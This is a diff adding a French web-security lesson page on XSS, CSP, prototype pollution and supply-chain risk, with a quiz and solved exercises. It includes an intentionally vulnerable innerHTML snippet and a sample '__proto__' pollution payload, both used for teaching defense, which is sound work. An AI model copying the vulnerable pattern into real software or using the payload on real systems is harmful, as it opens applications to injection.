+      <tr><td>Supply chain / CDN</td><td><code>npm audit</code> en CI, <code>integrity</code> (SRI) sur l'externe</td><td>minimiser les dépendances</td></tr>
+      <tr><td>Exécution de chaîne</td><td>jamais <code>eval</code>/<code>Function</code>/<code>setTimeout("…")</code></td><td>parseur restreint, données typées</td></tr>
+      <tr><td>Vol de jeton</td><td>cookie <code>HttpOnly; Secure; SameSite</code>, pas <code>localStorage</code></td><td>jeton anti-CSRF, scope minimal</td></tr>
+      <tr><td>Clickjacking</td><td><code>frame-ancestors 'none'</code> (ou <code>X-Frame-Options</code>)</td><td>vérifier l'origine des <code>postMessage</code></td></tr>
+    </tbody>
+  </table>
+</figure>
+
+<h2>Glossaire</h2>
+<dl class="glossary">
+  <dt>XSS (Cross-Site Scripting)</dt>
+  <dd>Injection de code exécuté dans le navigateur d'une victime&nbsp;; la variante <strong>DOM-based</strong> naît d'un <em>sink</em> côté client (<code>innerHTML</code>) sans passer par le serveur.</dd>
+  <dt>Sink</dt>
+  <dd>Point du code où une donnée devient active (parsée en HTML, exécutée)&nbsp;: <code>innerHTML</code>, <code>eval</code>, <code>script.src</code>… C'est là que le XSS se déclenche.</dd>
+  <dt>Sanitization</dt>
+  <dd>Nettoyage d'un HTML non fiable en ne gardant que des balises et attributs autorisés, via une bibliothèque durcie comme <strong>DOMPurify</strong> — jamais une regex maison.</dd>
+  <dt>Trusted Types</dt>
+  <dd>API navigateur qui transforme les sinks dangereux en erreur de type, sauf si la valeur provient d'une <em>policy</em> explicite&nbsp;: rend le XSS DOM-based structurellement impossible.</dd>
+  <dt>CSP (Content-Security-Policy)</dt>
+  <dd>En-tête qui restreint les sources autorisées (scripts, styles, connexions). Bien réglée (sans <code>'unsafe-inline'</code>), elle empêche un script injecté de s'exécuter.</dd>
+  <dt>Nonce</dt>
+  <dd>Jeton aléatoire, unique par réponse, apposé sur les scripts légitimes (<code>nonce-…</code>)&nbsp;; un script injecté ne peut pas le deviner, donc la CSP le refuse.</dd>
+  <dt>Prototype pollution</dt>
+  <dd>Vulnérabilité JS où l'écriture d'une clé <code>__proto__</code> lors d'un merge ou d'un parse contamine <code>Object.prototype</code>, donc tous les objets du programme.</dd>
+  <dt>SRI (Subresource Integrity)</dt>
+  <dd>Attribut <code>integrity</code> contenant le hash attendu d'une ressource externe&nbsp;; si le CDN sert un fichier altéré, le navigateur refuse de l'exécuter.</dd>
+</dl>
+
+<h2>Récap et vérification</h2>
+<ul>
+<li>Le XSS DOM-based naît d'un sink (<code>innerHTML</code>, <code>eval</code>)&nbsp;: privilégie <code>textContent</code>, échappe selon le contexte, sanitize avec DOMPurify, verrouille avec Trusted Types.</li>
+<li>La CSP est une défense en profondeur&nbsp;: bloque l'inline, autorise par nonce (unique par réponse) ou par hash, jamais <code>'unsafe-inline'</code>/<code>'unsafe-eval'</code>.</li>
+<li>La prototype pollution se défend par filtrage de <code>__proto__</code>/<code>constructor</code>, <code>Object.create(null)</code>, <code>Map</code> et validation par schéma.</li>
+<li>La supply chain se maîtrise par <code>npm audit</code> en CI, SRI sur les CDN, vigilance au typosquatting et minimisation des dépendances.</li>
+<li><code>eval</code>/<code>Function</code>/<code>setTimeout(string)</code> sont bannis&nbsp;; le JWT va dans un cookie <code>HttpOnly; Secure; SameSite</code>, pas dans <code>localStorage</code>.</li>
+</ul>
+<div class="lesson-check"><p class="kicker kicker--gold">Vérifie ta compréhension</p><ol><li>Pourquoi un même fragment de donnée exige-t-il un échappement différent en corps HTML, en attribut et en URL&nbsp;? Donne le bon outil pour chacun.</li><li>En quoi un cookie <code>HttpOnly</code> protège-t-il un jeton contre le XSS là où <code>localStorage</code> échoue&nbsp;? Quel risque réintroduit-il et comment le couvrir&nbsp;?</li><li>Pourquoi <code>'unsafe-inline'</code> dans <code>script-src</code> annule-t-il l'essentiel de la valeur d'une CSP, et que mettre à la place&nbsp;?</li></ol></div>
+
+<script type="application/json" data-quiz>
+[
+  {"q":"Pourquoi un même fragment de donnée exige-t-il un échappement différent en corps HTML, en attribut et en URL ? Donne le bon outil pour chacun.","a":["Chaque contexte a sa syntaxe : corps HTML → échapper en entités (& < > \") ; attribut → échappement d'attribut (guillemets) ; URL → encodeURIComponent. Le mauvais échappement laisse une faille","Un seul échappement suffit partout","Il ne faut jamais échapper en attribut","encodeURIComponent convient au corps HTML"],"correct":0,"explain":"Une valeur sûre dans un contexte peut être dangereuse dans un autre. On échappe selon la destination : entités HTML dans le contenu/les attributs, encodeURIComponent dans une URL. Utiliser le bon outil par contexte est la base de la prévention XSS."},
+  {"q":"En quoi un cookie HttpOnly protège-t-il un jeton contre le XSS là où localStorage échoue, et quel risque réintroduit-il ?","a":["HttpOnly rend le cookie inaccessible au JavaScript : un XSS ne peut pas le voler, alors que localStorage est lisible par tout script. En revanche le cookie réintroduit le risque CSRF, qu'on couvre avec SameSite (et/ou un jeton anti-CSRF)","localStorage est plus sûr","HttpOnly empêche tout vol et n'a aucun inconvénient","Le cookie supprime le risque CSRF"],"correct":0,"explain":"Un jeton en localStorage est exposé à n'importe quel script injecté. Un cookie HttpOnly échappe au JS, ce qui contre le vol par XSS. Mais comme il part automatiquement avec les requêtes, il ouvre la porte au CSRF : SameSite (Lax/Strict) ou un anti-CSRF le neutralise."},
+  {"q":"Pourquoi 'unsafe-inline' dans script-src annule-t-il l'essentiel de la valeur d'une CSP, et que mettre à la place ?","a":["Parce qu'il réautorise tout script inline, donc précisément l'injection que la CSP devait bloquer : elle perd son intérêt. À la place, on utilise des nonces (nonce-...) ou des hashes pour n'autoriser que des scripts précis","'unsafe-inline' renforce la CSP","Il faut autoriser tous les domaines","Il n'y a pas d'alternative"],"correct":0,"explain":"Le rôle d'une CSP est d'empêcher l'exécution de scripts non prévus. 'unsafe-inline' rouvre les scripts inline, vecteur classique du XSS, vidant la politique de son sens. Les nonces ou hashes autorisent nominativement les scripts légitimes."}
+]
+</script>
+
+<h2>Exercices</h2>
+<script type="application/json" data-exos>
+[
+  {"type":"text","accept":["textContent","element.textContent",".textContent","innerText"],"placeholder":"la propriété SÛRE à utiliser à la place de innerHTML pour afficher un commentaire en texte simple : …","hints":["innerHTML interprète les balises (donc un <script>).","textContent insère du texte brut, échappé.","element.???????????"],"link":{"href":"lecon-17.html","label":"Revoir « Éviter le XSS »"}},
+  {"type":"text","accept":["__proto__","proto","prototype","constructor"],"placeholder":"la clé spéciale à BANNIR dans deepMerge pour empêcher la prototype pollution : …","hints":["Écrire dessus modifierait Object.prototype global.","On la met dans une liste interdite (avec constructor, prototype).","Deux underscores de chaque côté."],"link":{"href":"lecon-17.html","label":"Revoir « La prototype pollution »"}},
+  {"type":"text","accept":["CSP","Content-Security-Policy","content-security-policy","csp"],"placeholder":"le nom de l'en-tête HTTP qui restreint les sources de scripts/styles/XHR (sigle) : …","hints":["script-src 'self', etc.","Un nonce autorise les scripts inline de confiance.","Sigle : C_P (Content-Security-Policy)."],"link":{"href":"lecon-17.html","label":"Revoir « La CSP »"}}
+]
+</script>
+
+<div class="exercise"><div class="exercise__head"><span class="exercise__num">Exercice 1</span><span class="exercise__level">Échauffement</span></div><p>Le code ci-dessous affiche un commentaire utilisateur via <code>innerHTML</code> et est vulnérable au XSS. Corrige-le pour le texte simple, puis propose la variante pour du HTML riche autorisé.</p>
+<figure class="code-block" data-file="app.js"><pre><code class="language-javascript">function render(comment) {
+  box.innerHTML = comment.body; // VULNÉRABLE
+}</code></pre></figure>
+<details><summary>Voir une solution</summary><figure class="code-block" data-file="solution"><pre><code class="language-javascript">import DOMPurify from 'dompurify';
+
+// Cas 1 : texte simple =&gt; aucun parsing HTML
+function renderText(comment) {
+  box.textContent = comment.body;
+  // &lt;script&gt;... reste du texte inerte
+}
+
+// Cas 2 : HTML riche autorisé (gras, liens) =&gt; sanitization
+function renderRich(comment) {
+  box.innerHTML = DOMPurify.sanitize(comment.body, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br'],
+    ALLOWED_ATTR: ['href'],
+  });
+  // onerror=, &lt;script&gt;, javascript:href =&gt; supprimés
+}</code></pre></figure></details></div>
+
+<div class="exercise"><div class="exercise__head"><span class="exercise__num">Exercice 2</span><span class="exercise__level">Application</span></div><p>Écris <code>deepMerge(target, source)</code> immunisé contre la prototype pollution&nbsp;: il doit fusionner récursivement les objets sans jamais permettre d'écrire sur <code>Object.prototype</code>. Démontre que <code>{"__proto__":{"polluted":1}}</code> ne pollue rien.</p>
+<details><summary>Voir une solution</summary><figure class="code-block" data-file="solution"><pre><code class="language-javascript">const BANNED = new Set(['__proto__', 'constructor', 'prototype']);
+
+function deepMerge(target, source) {
+  for (const key of Object.keys(source)) {    // énumérables propres seul.
+    if (BANNED.has(key)) continue;            // verrou anti-pollution
+    const val = source[key];
+    if (val &amp;&amp; typeof val === 'object' &amp;&amp; !Array.isArray(val)) {
+      // sous-objet sans prototype : pas de chaîne à polluer
+      target[key] = deepMerge(
+        Object.prototype.hasOwnProperty.call(target, key) &amp;&amp;
+          typeof target[key] === 'object'
+          ? target[key]
+          : Object.create(null),
+        val
+      );
+    } else {
+      target[key] = val;
+    }
+  }
+  return target;
+}
+
+const payload = JSON.parse('{"a":1,"__proto__":{"polluted":1}}');
+const out = deepMerge({}, payload);
+console.log(out.a);          // 1   (fusion normale OK)
+console.log(({}).polluted);  // undefined  =&gt; Object.prototype intact</code></pre></figure></details></div>
+
+<div class="exercise"><div class="exercise__head"><span class="exercise__num">Exercice 3</span><span class="exercise__level">Défi</span></div><p>Rédige une directive CSP de base pour une SPA qui&nbsp;: ne charge scripts, styles et XHR que depuis sa propre origine&nbsp;; autorise ses scripts inline par <strong>nonce</strong>&nbsp;; interdit <code>object</code>, l'iframe par des tiers et le détournement de <code>base</code>. Montre l'en-tête généré côté serveur.</p>
+<details><summary>Voir une solution</summary><figure class="code-block" data-file="solution"><pre><code class="language-javascript">import crypto from 'node:crypto';
+
+function cspHeader() {
+  const nonce = crypto.randomBytes(16).toString('base64');
+  const policy = [
+    "default-src 'self'",
+    `script-src 'self' 'nonce-${nonce}'`, // inline via nonce, pas unsafe
+    "style-src 'self'",
+    "connect-src 'self'",                 // fetch/XHR même origine
+    "img-src 'self' data:",
+    "object-src 'none'",                  // pas de plugins Flash/etc.
+    "frame-ancestors 'none'",             // anti-clickjacking
+    "base-uri 'none'",                    // anti-détournement de &lt;base&gt;
+    "require-trusted-types-for 'script'", // bonus : verrou DOM sinks
+  ].join('; ');
+  return { nonce, policy };
+}
+
+const { nonce, policy } = cspHeader();
+res.setHeader('Content-Security-Policy', policy);
+// Template : &lt;script nonce="{{nonce}}"&gt;init()&lt;/script&gt;
+// Un &lt;script&gt; injecté sans ce nonce =&gt; refusé par le navigateur.</code></pre></figure></details></div>
+
+              <button class="btn btn--primary" data-complete-toggle aria-pressed="false">
+                <span>Marquer comme terminée</span>
+              </button>
+
+              <nav class="lesson-nav" data-lesson-nav aria-label="Navigation entre leçons"></nav>
+            </article>
+          </div>
+
+          <aside class="lesson-rail lesson-toc-rail" aria-label="Sommaire">
+            <p class="toc__title">Sur cette page</p>
+            <nav class="toc" aria-label="Sommaire de la leçon"><div data-toc></div></nav>
+          </aside>
+        </div>
+      </div>
+    </main>
+
+    <footer class="site-footer">
+      <div class="container">
+        <div class="site-footer__bottom">
+          <span>© <span data-year>2026</span> Syntaxe. Projet de démonstration.</span>
+          <span><a href="cours.html">← Retour au programme du cours</a></span>
+        </div>
+      </div>
+    </footer>
+
+    <script src="../../js/data.js" defer></script>
+    <script src="../../js/main.js" defer></script>
+    <script src="../../js/lecon.js" defer></script>
+    <script src="../../js/runner.js" defer></script>
+    <script src="../../assets/vendor/prism/prism-core.min.js" defer></script>
+    <script src="../../assets/vendor/prism/prism-bash.min.js" defer></script>
+    <script src="../../assets/vendor/prism/prism-clike.min.js" defer></script>
+    <script src="../../assets/vendor/prism/prism-javascript.min.js" defer></script>
+  </body>
+</html>
